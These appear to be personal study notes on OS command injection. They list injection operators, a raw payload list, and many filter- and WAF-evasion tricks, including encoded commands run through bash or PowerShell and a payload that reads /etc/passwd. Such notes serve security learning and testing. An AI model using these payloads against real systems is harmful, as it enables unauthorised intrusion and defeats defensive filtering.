#commandinjection 
- Executing code in OS
- Underlying commands ran to update information, such as `hostname` or `ping`
- Need to understand basics of OS commands
- PHP
	- `exec`, `system`, `shell_exec`, `passthru`, or `popen`
- NodeJS
	- `child_process.exec` or `child_process.spawn`
- C#
	- `Process.{various methods}}`, `ProcessStartInfo`
- `LDAP injection`, `NoSQL Injection`, `HTTP Header Injection`, `XPath Injection`, `IMAP Injection`, `ORM Injection`, and others

| **Injection**                           | **Description**                                                               |
| ----------------------------------- | ------------------------------------------------------------------------- |
| OS Command Injection                | Occurs when user input is directly used as part of an OS command.         |
| Code Injection                      | Occurs when user input is directly within a function that evaluates code. |
| SQL Injections                      | Occurs when user input is directly used as part of an SQL query.          |
| Cross-Site Scripting/HTML Injection | Occurs when exact user input is displayed on a web page.                  |

|**Injection Operator**|**Injection Character**|**URL-Encoded Character**|**Executed Command**|
|---|---|---|---|
|Semicolon|`;`|`%3b`|Both|
|New Line|`\n`|`%0a`|Both|
|Background|`&`|`%26`|Both (second output generally shown first)|
|Pipe|`\|`|`%7c`|Both (only second output is shown)|
|AND|`&&`|`%26%26`|Both (only if first succeeds)|
|OR|`\|`|`%7c%7c`|Second (only if first fails)|
|Sub-Shell|` `` `|`%60%60`|Both (Linux-only)|
|Sub-Shell|`$()`|`%24%28%29`|Both (Linux-only)|


#### Detection
- Typically if there is any user interaction or input that could run system operations behind the scenes
- Some characters may be rejected/filtered
- Some payloads may trigger WAF rules
- May need to test one char at a time to see what is filtered/triggers
- May be filtered by words or commands


#### Injection Commands
- may need to bypass client side filtering
- may need to try different operators (see above)
- may need to URL encode
- substitute tab for space
- mix char case
- char reversal - make them backwards
- character shifting - find an ascii char that can be shifted into the char that is filtered
- various encoding *for complex command strings, try encoding first*
- subshell - child sends results to parent - first command should be the deepest 'child'
- Char Tricks
	- Linux Char tricks
		- `${IFS}` Linux Environment Variable defaults to space or tab
		- **Bash Brace Expansion**  adds space between arguments inside `{}`
		- `${PATH:0:1}` returns `/`
		- `${LS_COLORS:10:1}` returns `;`
			- `127.0.0.1${LS_COLORS:10:1}${IFS}`
		- `printenv` returns all environment variables, may have useful chars
		- `$(tr '!-}' '"-~'<<<[)` is a char shift that returns a `\`
	- Windows Char tricks
		- `%HOMEPATH:~6,-11%` returns `\`
		- `$env:HOMEPATH[0]` returns `\`
		- `$env:PROGRAMFILES[10]` returns a space
		- `Get-ChildItem Env` returns all environment variables, may have useful chars
- Command filtering tricks
	- `w'h'o'am'i` or `w"h"o"am"i`  to return `whoami`
	- `openssl` instead of other b64
	- `xxd` for decoding hex
	- Linux
		- `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` to return `whoami`
		- `who$@ami` or `w\ho\am\i` to return `whoami`
		- `$(rev<<<'imaohw')`  to return `whoami`
		- `$(a="WhOaMi";printf %s "${a,,}")` to return `whoami`
		- `'cat /etc/passwd | grep 33' | base64` encode command to return UID/GID 33 (commonly `www-data` user)
		- `echo -n whoami | iconv -f utf-8 -t utf-16le | base64` get b64 of `whoami`
		- `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)` decode the b64 command
		- `sh` instead of `bash`
	- Windows
		- `who^ami` to return `whoami`
		- `WhOaMi` to return `whoami`
		- `"whoami"[-1..-20] -join ''` to return `whoami`
		- `iex "$('imaohw'[-1..-20] -join '')"` to return `whoami`
		- `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))` b64 of `whoami`
		- `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"` decode the b64 command

| **Injection Type**                      | **Operators**                                     |
| --------------------------------------- | ------------------------------------------------- |
| SQL Injection                           | `'` `,` `;` `--` `/* */`                          |
| Command Injection                       | `;` `&&`                                          |
| LDAP Injection                          | `*` `(` `)` `&` `\|`                              |
| XPath Injection                         | `'` `or` `and` `not` `substring` `concat` `count` |
| OS Command Injection                    | `;` `&` `\|`                                      |
| Code Injection                          | `'` `;` `--` `/* */` `$()` `${}` `#{}` `%{}` `^`  |
| Directory Traversal/File Path Traversal | `../` `..\\` `%00`                                |
| Object Injection                        | `;` `&` `\|`                                      |
| XQuery Injection                        | `'` `;` `--` `/* */`                              |
| Shellcode Injection                     | `\x` `\u` `%u` `%n`                               |
| Header Injection                        | `\n` `\r\n` `\t` `%0d` `%0a` `%09`                |

#### Evasion tools
- [GitHub - Bashfuscator/Bashfuscator: A fully configurable and extendable Bash obfuscation framework. This tool is intended to help both red team and blue team.](https://github.com/Bashfuscator/Bashfuscator)
- [GitHub - danielbohannon/Invoke-DOSfuscation: Cmd.exe Command Obfuscation Generator & Detection Test Harness](https://github.com/danielbohannon/Invoke-DOSfuscation)

;
%3b
\n
%0a
&
%26
|
%7c
&&
%26%26
||
%7c%7c
``
%60%60
$()
%24%28%29


uname
u'n'a'm'e
${uname}
$(uname)
{uname}
$(rev<<<'emanu')
bash<<<$(base64 -d<<<dW5hbWUgLWE=)
b'a's'h'<<<$('b'a's'e'6'4 -d<<<dW5hbWUgLWE=)
l's'${IFS}${PATH:0:1}${IFS}-a'l'


| Code                    | Description                                                                        |
| ----------------------- | ---------------------------------------------------------------------------------- |
| `printenv`              | Can be used to view all environment variables                                      |
| **Spaces**              |                                                                                    |
| `%09`                   | Using tabs instead of spaces                                                       |
| `${IFS}`                | Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. `$()`) |
| `{ls,-la}`              | Commas will be replaced with spaces                                                |
| **Other Characters**    |                                                                                    |
| `${PATH:0:1}`           | Will be replaced with forward slash `/`                                            |
| `${LS_COLORS:10:1}`     | Will be replaced with `;`                                                          |
| `$(tr '!-}' '"-~'<<<[)` | Shift character by one to produce back slash (`[` -> `\`)                          |
| `$(tr '!-}' '"-~'<<<:)` | Character Shifting by one to give a semicolon (`:` -> `;`)                         |




| Code                                                         | Description                         |     |     |
| ------------------------------------------------------------ | ----------------------------------- | --- | --- |
| **Character Insertion**                                      |                                     |     |     |
| `'` or `"`                                                   | Total must be even                  |     |     |
| `$@` or `\`                                                  | Linux only                          |     |     |
| **Case Manipulation**                                        |                                     |     |     |
| `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`                           | Execute command regardless of cases |     |     |
| `$(a="WhOaMi";printf %s "${a,,}")`                           | Another variation of the technique  |     |     |
| **Reversed Commands**                                        |                                     |     |     |
| `echo 'whoami' \| rev`                                       | Reverse a string                    |     |     |
| `$(rev<<<'imaohw')`                                          | Execute reversed command            |     |     |
| **Encoded Commands**                                         |                                     |     |     |
| `echo -n 'cat /etc/passwd \| grep 33' \| base64`             | Encode a string with base64         |     |     |
| `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)` | Execute b64 encoded string          |     |     |

|Code|Description|
|---|---|
|`printenv`|Can be used to view all environment variables|
|**Spaces**||
|`%09`|Using tabs instead of spaces|
|`${IFS}`|Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. `$()`)|
|`{ls,-la}`|Commas will be replaced with spaces|
|**Other Characters**||
|`${PATH:0:1}`|Will be replaced with forward slash `/`|
|`${LS_COLORS:10:1}`|Will be replaced with `;`|
|`$(tr '!-}' '"-~'<<<[)`|Shift character by one to produce back slash (`[` -> `\`)|
|`$(tr '!-}' '"-~'<<<:)`|Character Shifting by one to give a semicolon (`:` -> `;`)|

|Code|Description|
|---|---|
|**Character Insertion**||
|`'` or `"`|Total must be even|
|`$@` or `\`|Linux only|
|**Case Manipulation**||
|`$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")`|Execute command regardless of cases|
|`$(a="WhOaMi";printf %s "${a,,}")`|Another variation of the technique|
|**Reversed Commands**||
|`echo 'whoami' \| rev`|Reverse a string|
|`$(rev<<<'imaohw')`|Execute reversed command|
|**Encoded Commands**||
|`echo -n 'cat /etc/passwd \| grep 33' \| base64`|Encode a string with base64|
|`bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)`|Execute b64 encoded string|

| Code                    | Description                                                  |
| ----------------------- | ------------------------------------------------------------ |
| `Get-ChildItem Env:`    | Can be used to view all environment variables - (PowerShell) |
| **Spaces**              |                                                              |
| `%09`                   | Using tabs instead of spaces                                 |
| `%PROGRAMFILES:~10,-5%` | Will be replaced with a space - (CMD)                        |
| `$env:PROGRAMFILES[10]` | Will be replaced with a space - (PowerShell)                 |
| **Other Characters**    |                                                              |
| `%HOMEPATH:~0,-17%`     | Will be replaced with `\` - (CMD)                            |
| `$env:HOMEPATH[0]`      | Will be replaced with `\` - (PowerShell)                     |
| 

